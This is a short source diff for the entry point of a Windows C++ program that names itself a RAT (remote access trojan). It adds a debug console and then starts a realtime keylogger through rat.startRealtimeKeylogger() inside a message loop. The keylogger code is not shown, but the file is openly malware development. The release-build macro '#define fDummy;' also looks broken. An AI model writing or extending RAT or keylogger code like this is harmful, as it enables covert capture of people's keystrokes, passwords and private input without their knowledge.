@@ -1,8 +1,23 @@
-#include <iostream>
 #include "rat/rat.h"
+#include "helper/debug.h"
 
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    RAT rat;
+#ifdef _DEBUG
+FILE* fDummy;
+#else
+#define fDummy;
+#endif
+
+void SetupDebugConsole() {
+	AllocConsole();
+	freopen_s(&fDummy, "CONIN$", "r", stdin);
+	freopen_s(&fDummy, "CONOUT$", "w", stderr);
+	freopen_s(&fDummy, "CONOUT$", "w", stdout);
+}
+
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+	SetupDebugConsole();
+	
+	RAT rat;
     rat.startRealtimeKeylogger();
 
 	MSG msg;
@@ -12,7 +27,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 			// handle error
 		}
 		else {
-			// Remove later to receive no input
 			TranslateMessage(&msg);
 			DispatchMessage(&msg);
 		}
